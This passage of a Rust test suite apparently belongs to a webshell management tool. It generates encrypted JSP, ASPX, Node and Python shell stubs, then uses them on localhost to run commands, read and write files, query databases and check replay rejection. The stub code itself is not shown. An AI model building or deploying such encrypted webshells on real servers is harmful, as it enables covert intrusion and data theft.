            .find_map(|line| line.strip_prefix("OPENED:"))
            .unwrap_or_else(|| panic!("缺少 OPENED 行：{text}"));
        assert_eq!(opened, request, "C# 应能解开 Rust 帧");
        assert!(text.contains("REPLAY-REJECTED"), "C# 应拒绝重放：{text}");
        let key = dosword_sdk::aead::derive_key("secret");
        let (_, plain) = dosword_sdk::aead::open(&key, dosword_sdk::aead::DIR_RESPONSE, sealed)
            .expect("Rust 应能解开 C# 帧");
        assert_eq!(String::from_utf8_lossy(&plain), request);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// 抽出 JSP stub 的声明块与脚本片段，包成一个可编译的普通 Java 类。
    ///
    /// 脚本片段用桩类型承接 servlet 隐式对象（request/response/out），
    /// 因此能在**无容器**环境下做编译期校验（历史上转义错误导致整份 stub
    /// 根本无法编译，且没有任何测试能发现）。
    fn jsp_compile_harness(stub: &str, class: &str) -> String {
        let start = stub.find("<%!").expect("声明块起点") + 3;
        let end = start + stub[start..].find("%>").expect("声明块终点");
        let decls = &stub[start..end];
        let sstart = stub.rfind("<%").expect("脚本片段起点") + 2;
        let send = sstart + stub[sstart..].find("%>").expect("脚本片段终点");
        let scriptlet = &stub[sstart..send];
        assert!(scriptlet.contains("formData"), "脚本片段抽取失败");
        format!(
            r#"
import java.io.*;
import java.util.*;
import java.nio.charset.*;
class DSW_Req {{ String getHeader(String n) {{ return null; }} String getParameter(String n) {{ return null; }} }}
class DSW_Resp {{ void setStatus(int c) {{}} }}
class DSW_Out {{ void print(String s) {{}} }}
public class {class} {{
{decls}
  static void DSW_page(DSW_Req request, DSW_Resp response, DSW_Out out) throws Exception {{
{scriptlet}
  }}
}}
"#
        )
    }

    fn javac_available() -> bool {
        std::process::Command::new("javac")
            .arg("-version")
            .output()
            .is_ok()
    }

    fn dotnet_available() -> bool {
        std::process::Command::new("dotnet")
            .arg("--version")
            .output()
            .is_ok()
    }

    /// 编译期校验一份 JSP stub（返回 javac 输出）。
    fn compile_jsp_stub(stub: &str, class: &str) -> std::process::Output {
        let dir = std::env::temp_dir().join(format!(
            "dosword-{}-{}",
            class.to_lowercase(),
            uuid::Uuid::new_v4()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let file = dir.join(format!("{class}.java"));
        std::fs::write(&file, jsp_compile_harness(stub, class)).unwrap();
        let output = std::process::Command::new("javac")
            .arg("-encoding")
            .arg("UTF-8")
            .arg("-d")
            .arg(&dir)
            .arg(&file)
            .output()
            .expect("运行 javac");
        let _ = std::fs::remove_dir_all(&dir);
        output
    }

    /// 抽出 ASPX stub 的 `<script runat="server">` 声明块与脚本片段，
    /// 用桩类型承接 Page 成员（Request/Response），包成可编译的 C# 类。
    fn aspx_compile_harness(stub: &str, class: &str) -> String {
        let marker = "<script runat=\"server\">";
        let start = stub.find(marker).expect("script 起点") + marker.len();
        let end = stub.find("</script>").expect("script 终点");
        let decls = &stub[start..end];
        let sstart = stub[end..].find("<%").expect("脚本片段起点") + end + 2;
        let send = sstart + stub[sstart..].find("%>").expect("脚本片段终点");
        let scriptlet = &stub[sstart..send];
        assert!(scriptlet.contains("formData"), "脚本片段抽取失败");
        format!(
            r#"using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Security.Cryptography;
class DSW_Req {{
  public System.Collections.Generic.Dictionary<string, string> Headers = new System.Collections.Generic.Dictionary<string, string>();
  public System.Collections.Generic.Dictionary<string, string> ServerVariables = new System.Collections.Generic.Dictionary<string, string>();
  public string this[string k] {{ get {{ return null; }} }}
}}
class DSW_Resp {{ public int StatusCode; public void End() {{}} public void Write(string s) {{}} }}
class {class} {{
{decls}
  static void DSW_page(DSW_Req Request, DSW_Resp Response) {{
{scriptlet}
  }}
  static void Main() {{}}
}}
"#
        )
    }

    /// 编译期校验一份 ASPX stub（返回 dotnet 输出；无 dotnet 时返回 None）。
    fn compile_aspx_stub(stub: &str, class: &str) -> Option<std::process::Output> {
        if !dotnet_available() {
            return None;
        }
        let dir = std::env::temp_dir().join(format!(
            "dosword-{}-{}",
            class.to_lowercase(),
            uuid::Uuid::new_v4()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let created = std::process::Command::new("dotnet")
            .arg("new")
            .arg("console")
            .arg("-o")
            .arg(&dir)
            .arg("--force")
            .output()
            .expect("运行 dotnet new");
        if !created.status.success() {
            let _ = std::fs::remove_dir_all(&dir);
            return None;
        }
        std::fs::write(dir.join("Program.cs"), aspx_compile_harness(stub, class)).unwrap();
        let output = std::process::Command::new("dotnet")
            .current_dir(&dir)
            .arg("build")
            .arg("--nologo")
            .arg("-v")
            .arg("q")
            .output()
            .expect("运行 dotnet build");
        let _ = std::fs::remove_dir_all(&dir);
        Some(output)
    }

    /// NATIVE（XOR）变体与 AEAD 变体共用同一 JSP / ASPX 模板：
    /// 这里对 native 变体做编译期校验（AEAD 变体由上面的互操作测试覆盖）。
    #[test]
    fn native_jsp_aspx_stubs_compile() {
        if !javac_available() {
            eprintln!("跳过 JSP：无 javac");
        } else {
            let stub = NativeEncoder { crypto: "xor" }
                .stub("jsp", "secret")
                .expect("生成 JSP native stub");
            let output = compile_jsp_stub(&stub, "StubTestNativeJsp");
            assert!(
                output.status.success(),
                "JSP native stub 编译失败：{}{}",
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr)
            );
        }
        let stub = NativeEncoder { crypto: "xor" }
            .stub("aspx", "secret")
            .expect("生成 ASPX native stub");
        match compile_aspx_stub(&stub, "StubTestNativeAspx") {
            None => eprintln!("跳过 ASPX：无 dotnet"),
            Some(output) => assert!(
                output.status.success(),
                "ASPX native stub 编译失败：{}{}",
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr)
            ),
        }
    }

    /// 经典 ASP 没有内置 AES-GCM：连接前就明确拒绝（与生成端同因），
    /// 其余四种语言的 AEAD 会话可正常建立。
    #[test]
    fn asp_aead_rejected_before_connect() {
        let settings = settings();
        let params = r#"{"encoder":"native_aead"}"#;
        let error = make_session(
            "builtin.asp.v1",
            "http://127.0.0.1:1/x.asp",
            "secret",
            params,
            &settings,
        )
        .err()
        .expect("经典 ASP + AEAD 应拒绝");
        assert!(error.to_string().contains("AES-GCM"), "{error}");
        for id in [
            "builtin.jsp.v1",
            "builtin.aspnet.v1",
            "builtin.python.v1",
            "builtin.node.v1",
        ] {
            let session = make_session(id, "http://127.0.0.1:1/x", "secret", params, &settings)
                .unwrap_or_else(|error| panic!("{id} 应可建立 AEAD 会话：{error}"));
            assert!(session.aead.is_some(), "{id} 应启用 AEAD 通道");
        }
    }

    /// AEAD：Node stub 端到端（连接/命令/文件/分块）+ 重放拒绝。
    #[test]
    fn aead_node_stub_round_trip_and_replay() {
        if std::process::Command::new("node")
            .arg("--version")
            .output()
            .is_err()
        {
            eprintln!("跳过：无 node");
            return;
        }
        let settings = settings();
        let stub = dosword_sdk::encoder::AeadEncoder
            .stub("node", "secret")
            .expect("生成 AEAD node stub");
        let dir = std::env::temp_dir().join(format!("dosword-node-aead-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let script = dir.join("shell.js");
        std::fs::write(&script, &stub).unwrap();
        let port = {
            use std::net::TcpListener;
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let child = std::process::Command::new("node")
            .arg(&script)
            .env("PORT", port.to_string())
            .current_dir(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
        let Some(mut child) = child.ok() else {
            eprintln!("跳过 node AEAD 往返：未检测到 node 可执行文件");
            return;
        };
        if !crate::protocol::wait_http_ready(port, 10_000) {
            eprintln!("跳过 node AEAD 往返：服务器未就绪");
            let _ = child.kill();
            return;
        }
        let url = format!("http://127.0.0.1:{port}/");
        let mut p = profile(&url);
        p.protocol_id = "builtin.node.v1".into();
        p.protocol_params = r#"{"encoder":"native_aead"}"#.into();
        let protocol = NodeProtocol;
        let result = (|| -> Result<(), ProtocolError> {
            let (session, probe) = protocol.connect(&p, &settings)?;
            assert_eq!(probe.status, "online");
            let out = protocol.execute_command(session.as_ref(), "printf aead-node", &settings)?;
            assert!(out.stdout.contains("aead-node"), "{}", out.stdout);
            protocol.list_dir(session.as_ref(), &dir.to_string_lossy(), &settings)?;
            let file = format!("{}/node_aead.txt", dir.display());
            protocol.write_file(session.as_ref(), &file, b"hello aead", &settings)?;
            assert_eq!(
                protocol.read_file(session.as_ref(), &file, &settings)?,
                b"hello aead"
            );
            protocol.write_file(session.as_ref(), &file, b"0123456789", &settings)?;
            assert_eq!(
                protocol.read_chunk(session.as_ref(), &file, 3, 4, &settings)?,
                b"3456"
            );
            assert_replay_rejected(&url);
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("Node AEAD stub 端到端应成功：{error}"));
    }

    /// AEAD：Python CGI stub 端到端 + 重放拒绝。
    #[test]
    fn aead_python_stub_round_trip_and_replay() {
        if std::process::Command::new("python3")
            .arg("--version")
            .output()
            .is_err()
        {
            eprintln!("跳过：无 python3");
            return;
        }
        let settings = settings();
        let stub = dosword_sdk::encoder::AeadEncoder
            .stub("python", "secret")
            .expect("生成 AEAD python stub");
        let dir = std::env::temp_dir().join(format!("dosword-py-aead-{}", uuid::Uuid::new_v4()));
        let cgi = dir.join("cgi-bin");
        std::fs::create_dir_all(&cgi).unwrap();
        let script = cgi.join("shell.py");
        std::fs::write(&script, &stub).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755));
        }
        let port = {
            use std::net::TcpListener;
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let child = std::process::Command::new("python3")
            .arg("-m")
            .arg("http.server")
            .arg("--cgi")
            .arg(port.to_string())
            .arg("--directory")
            .arg(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
        let Some(mut child) = child.ok() else {
            eprintln!("跳过 python AEAD 往返");
            return;
        };
        if !crate::protocol::wait_http_ready(port, 10_000) {
            eprintln!("跳过 python AEAD 往返：服务器未就绪");
            let _ = child.kill();
            return;
        }
        let url = format!("http://127.0.0.1:{port}/cgi-bin/shell.py");
        let mut p = profile(&url);
        p.protocol_id = "builtin.python.v1".into();
        p.protocol_params = r#"{"encoder":"native_aead"}"#.into();
        let protocol = PythonProtocol;
        let result = (|| -> Result<(), ProtocolError> {
            let (session, probe) = protocol.connect(&p, &settings)?;
            assert_eq!(probe.status, "online");
            let out = protocol.execute_command(session.as_ref(), "printf aead-py", &settings)?;
            assert!(out.stdout.contains("aead-py"), "{}", out.stdout);
            let file = format!("{}/py_aead.txt", dir.display());
            protocol.write_file(session.as_ref(), &file, b"hello aead", &settings)?;
            assert_eq!(
                protocol.read_file(session.as_ref(), &file, &settings)?,
                b"hello aead"
            );
            assert_replay_rejected(&url);
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("Python AEAD stub 端到端应成功：{error}"));
    }

    #[test]
    fn node_stub_round_trip_against_server() {
        // 真实 node 服务 + NodeProtocol 端到端
        if std::process::Command::new("node")
            .arg("--version")
            .output()
            .is_err()
        {
            eprintln!("跳过：无 node");
            return;
        }
        let dir = std::env::temp_dir().join(format!("dosword-node-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let stub = dosword_sdk::encoder::NativeEncoder { crypto: "xor" }
            .stub("node", "secret")
            .unwrap();
        let script = dir.join("shell.js");
        std::fs::write(&script, &stub).unwrap();
        let port = {
            use std::net::TcpListener;
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let child = std::process::Command::new("node")
            .arg(&script)
            .env("PORT", port.to_string())
            .current_dir(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
        let Some(mut child) = child.ok() else {
            eprintln!("跳过 node stub 往返：未检测到 node 可执行文件");
            return;
        };
        if !crate::protocol::wait_http_ready(port, 10_000) {
            eprintln!("跳过 node stub 往返：服务器未在 10 秒内就绪");
            let _ = child.kill();
            return;
        }
        let url = format!("http://127.0.0.1:{port}/");
        let settings = settings();
        let mut p = profile(&url);
        p.protocol_id = "builtin.node.v1".into();
        let protocol = NodeProtocol;
        let result = (|| -> Result<(), ProtocolError> {
            let (session, info) = protocol.connect(&p, &settings)?;
            assert!(
                info.runtime.contains("Node"),
                "Node probe runtime：{}",
                info.runtime
            );
            eprintln!("[node] probe ok: {}", info.runtime);
            let out = protocol.execute_command(session.as_ref(), "printf node-ok", &settings)?;
            assert_eq!(out.stdout, "node-ok", "Node 命令执行应输出：{}", out.stdout);
            eprintln!("[node] exec ok: {}", out.stdout);
            let listing = protocol.list_dir(session.as_ref(), &dir.to_string_lossy(), &settings)?;
            assert!(
                listing.entries.iter().any(|e| e.name == "shell.js"),
                "应列举出 shell.js"
            );
            eprintln!("[node] list ok（{} 项）", listing.entries.len());
            let test_file = format!("{}/node_write.txt", dir.display());
            protocol.write_file(session.as_ref(), &test_file, b"hello node", &settings)?;
            let content = protocol.read_file(session.as_ref(), &test_file, &settings)?;
            assert_eq!(content, b"hello node");
            // P2：分块读写（客户端已转发 stub 的 o/l）
            protocol.write_file(session.as_ref(), &test_file, b"0123456789", &settings)?;
            let chunk = protocol.read_chunk(session.as_ref(), &test_file, 3, 4, &settings)?;
            assert_eq!(chunk, b"3456", "分块读应返回指定范围");
            protocol.write_chunk(session.as_ref(), &test_file, b"XY", 2, &settings)?;
            let patched = protocol.read_file(session.as_ref(), &test_file, &settings)?;
            assert_eq!(patched, b"01XY456789", "分块写应覆盖指定偏移");
            eprintln!("[node] read/write ok");
            // DB：sqlite（node:sqlite）
            let db_file = format!("{}/node_test.db", dir.display());
            let conn = DbConnection {
                driver: "sqlite".into(),
                host: None,
                port: None,
                username: None,
                password: None,
                dbname: Some(db_file.clone()),
            };
            let probe = protocol.db_probe(session.as_ref(), &conn, &settings)?;
            assert!(!probe.databases.is_empty(), "{:?}", probe.databases);
            protocol.db_query(
                session.as_ref(),
                &conn,
                "CREATE TABLE IF NOT EXISTS t (id INTEGER, name TEXT)",
                &settings,
            )?;
            protocol.db_query(
                session.as_ref(),
                &conn,
                "INSERT INTO t VALUES (1, 'node')",
                &settings,
            )?;
            let q =
                protocol.db_query(session.as_ref(), &conn, "SELECT id, name FROM t", &settings)?;
            assert_eq!(q.columns, vec!["id".to_string(), "name".to_string()]);
            assert_eq!(q.rows.len(), 1);
            assert_eq!(q.rows[0][1].as_deref(), Some("node"));
            eprintln!("[node] db(sqlite) ok");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("Node stub 端到端应成功：{error}"));
    }

    #[test]
    fn jsp_stub_generates_for_all_crypto() {
        // JSP/ASP stub 生成（XOR 载荷）不应失败
        let stub = NativeEncoder { crypto: "xor" }
            .stub("jsp", "secret")
            .unwrap();
        assert!(stub.contains("formData"));
        assert!(stub.contains("DSW_md5"));
        let aspx = NativeEncoder { crypto: "xor" }
            .stub("aspx", "secret")
            .unwrap();
        assert!(aspx.contains("Process.Start"));
    }
}
